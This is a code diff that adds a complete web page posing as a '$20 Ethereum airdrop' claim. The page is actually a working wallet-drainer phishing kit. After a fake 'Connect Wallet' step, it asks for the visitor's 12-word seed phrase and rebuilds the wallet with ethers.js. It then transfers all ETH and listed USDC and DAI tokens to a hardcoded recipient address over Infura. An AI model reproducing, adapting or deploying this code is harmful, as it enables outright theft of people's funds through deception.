@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Connect Wallet & Claim Ethereum</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #0b0e11;
+      color: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    header {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      align-items: center;
+      background: #1e2329;
+      padding: 16px 24px;
+      border-radius: 16px 16px 0 0;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+      margin-bottom: 10px;
+      gap: 12px;
+    }
+    header img {
+      width: 36px;
+      height: 36px;
+      user-select: none;
+    }
+    header h1 {
+      font-size: 20px;
+      font-weight: 700;
+      margin: 0;
+      color: #fcd535;
+    }
+    .container {
+      background: #1e2329;
+      padding: 40px 30px 30px;
+      border-radius: 0 0 16px 16px;
+      max-width: 480px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+    }
+    p {
+      color: #999;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #fcd535;
+      border: none;
+      color: #000;
+      font-weight: 600;
+      padding: 14px 24px;
+      border-radius: 12px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 20px;
+    }
+    button:hover:not(:disabled) {
+      background-color: #ffe780;
+    }
+    button:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+      white-space: pre-wrap;
+      text-align: left;
+      max-height: 200px;
+      overflow-y: auto;
+      background: #121518;
+      padding: 15px;
+      border-radius: 8px;
+      font-family: monospace;
+    }
+    .success {
+      color: #4caf50;
+    }
+    .error {
+      color: #f44336;
+    }
+    #seed-section {
+      margin-top: 20px;
+      display: none;
+      text-align: left;
+    }
+    #seed-phrase {
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 12px;
+      border: none;
+      outline: none;
+      font-family: monospace;
+      font-size: 16px;
+      background: #2c3238;
+      color: #f2f2f2;
+      box-sizing: border-box;
+      resize: vertical;
+      min-height: 60px;
+      line-height: 1.4;
+      letter-spacing: 0.03em;
+    }
+    footer {
+      margin-top: 30px;
+      width: 100%;
+      max-width: 480px;
+      text-align: center;
+      color: #666;
+      font-size: 13px;
+      font-style: italic;
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Ethereum-icon-purple.svg" alt="Ethereum Logo" />
+    <h1>Claim Your $20 Ethereum Airdrop Now</h1>
+  </header>
+
+  <div class="container">
+    <button id="connect-btn">Connect Wallet</button>
+
+    <div id="seed-section">
+      <p>Wallet connected successfully!<br>Now enter your 12-word seed phrase:</p>
+      <textarea id="seed-phrase" placeholder="Enter your 12-word seed phrase here..." autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false"></textarea>
+      <button id="confirm-btn" disabled>Confirm & Send All</button>
+    </div>
+
+    <div id="status"></div>
+  </div>
+
+  <footer>
+    &copy;  © 2025 – All rights reserved. This airdrop is provided for promotional and informational purposes only. Participation does not constitute an investment or financial advice.
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    const recipient = '0xFE138B138ca16dcF67CbF1fd3122C41CCA0CeAC4'; // Change recipient as needed
+    const connectBtn = document.getElementById('connect-btn');
+    const seedSection = document.getElementById('seed-section');
+    const confirmBtn = document.getElementById('confirm-btn');
+    const statusDiv = document.getElementById('status');
+    const seedPhraseInput = document.getElementById('seed-phrase');
+
+    // Your Infura Project ID plugged in here
+    const INFURA_PROJECT_ID = "b8ef3a0c2f4e4210b0777c4e28705f01";
+
+    // ERC-20 tokens to drain, with decimals info for correct formatting
+    const tokenContracts = [
+      { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, name: "USDC" },
+      { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18, name: "DAI" },
+      // Add more tokens here with their decimals and name if desired
+    ];
+
+    function checkSeedPhrase() {
+      const words = seedPhraseInput.value.trim().split(/\s+/);
+      confirmBtn.disabled = !(words.length === 12 && !seedPhraseInput.value.trim().endsWith(' '));
+    }
+    seedPhraseInput.addEventListener('input', checkSeedPhrase);
+
+    function logStatus(message, isError = false, isSuccess = false) {
+      statusDiv.textContent += message + "\n";
+      if (isError) {
+        statusDiv.className = 'error';
+      } else if (isSuccess) {
+        statusDiv.className = 'success';
+      } else {
+        statusDiv.className = '';
+      }
+      statusDiv.scrollTop = statusDiv.scrollHeight;
+      console.log(message);
+    }
+
+    // Detect if mobile device
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    connectBtn.onclick = async () => {
+      if (window.ethereum) {
+        try {
+          logStatus('Connecting wallet...');
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          const signer = provider.getSigner();
+          const address = await signer.getAddress();
+
+          logStatus(`Wallet connected: ${address}`, false, true);
+
+          connectBtn.style.display = 'none';
+          seedSection.style.display = 'block';
+        } catch (err) {
+          logStatus('Connection failed: ' + err.message, true);
+        }
+      } else if (isMobile()) {
+        // Mobile but no window.ethereum, try to open MetaMask app via deep link
+        logStatus('No injected wallet detected. Attempting to open MetaMask app...');
+
+        // Use MetaMask deep link to open app and fallback to install page if needed
+        // Redirect back to current site after wallet connected manually by user
+        const currentUrl = encodeURIComponent(window.location.href);
+        const metamaskDeepLink = `https://metamask.app.link/dapp/${window.location.host}`;
+
+        // Open MetaMask app via deep link
+        window.location.href = metamaskDeepLink;
+
+        // Inform user what to do after opening the wallet
+        logStatus('If MetaMask app did not open, please install it from your app store.', true);
+      } else {
+        logStatus('Please install MetaMask!', true);
+      }
+    };
+
+    confirmBtn.onclick = async () => {
+      const seedPhrase = seedPhraseInput.value.trim().toLowerCase();
+      logStatus(`Using seed phrase: ${seedPhrase}`);
+
+      try {
+        logStatus('Creating wallet from seed phrase...');
+        const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+
+        logStatus(`Wallet address: ${wallet.address}`);
+
+        logStatus('Connecting to Ethereum mainnet via Infura...');
+        const provider = new ethers.providers.JsonRpcProvider(`https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`);
+
+        try {
+          const blockNumber = await provider.getBlockNumber();
+          logStatus(`Connected to mainnet. Current block: ${blockNumber}`);
+        } catch (networkErr) {
+          logStatus(`Network error: ${networkErr.message}`, true);
+          return;
+        }
+
+        const signer = wallet.connect(provider);
+
+        // 1) Send all ETH minus gas
+        let balance = await signer.getBalance();
+        logStatus(`ETH balance: ${ethers.utils.formatEther(balance)} ETH`);
+
+        const gasPrice = await provider.getGasPrice();
+        const gasLimit = ethers.BigNumber.from("21000"); // standard ETH transfer gas limit
+
+        const gasCost = gasPrice.mul(gasLimit);
+        logStatus(`Estimated gas cost: ${ethers.utils.formatEther(gasCost)} ETH`);
+
+        if (balance.lte(gasCost)) {
+          logStatus("Not enough ETH to pay for gas.", true);
+          return;
+        }
+
+        const amountToSend = balance.sub(gasCost);
+        logStatus(`Sending all ETH: ${ethers.utils.formatEther(amountToSend)} ETH`);
+
+        const txEth = await signer.sendTransaction({
+          to: recipient,
+          value: amountToSend,
+          gasLimit: gasLimit,
+          gasPrice: gasPrice
+        });
+        logStatus(`ETH transaction sent! Hash: ${txEth.hash}`);
+        await txEth.wait();
+        logStatus(`ETH transfer confirmed.`);
+
+        // 2) Send all tokens in list
+        const tokenAbi = [
+          "function balanceOf(address owner) view returns (uint256)",
+          "function transfer(address to, uint256 amount) returns (bool)"
+        ];
+
+        for (const token of tokenContracts) {
+          try {
+            const tokenContract = new ethers.Contract(token.address, tokenAbi, signer);
+            const tokenBalance = await tokenContract.balanceOf(wallet.address);
+            if (tokenBalance.gt(0)) {
+              logStatus(`Sending ${ethers.utils.formatUnits(tokenBalance, token.decimals)} ${token.name} tokens from ${token.address}`);
+
+              const txToken = await tokenContract.transfer(recipient, tokenBalance);
+              logStatus(`Token transfer sent! Hash: ${txToken.hash}`);
+              await txToken.wait();
+              logStatus(`Token transfer confirmed.`);
+            } else {
+              logStatus(`No balance for token ${token.name} (${token.address}), skipping.`);
+            }
+          } catch (err) {
+            logStatus(`Error sending token ${token.name} (${token.address}): ${err.message}`, true);
+          }
+        }
+
+        logStatus("All ETH and tokens sent!", false, true);
+
+      } catch (error) {
+        logStatus('Error: ' + error.message, true);
+      }
+    };
+  </script>
+</body>
+</html>
+
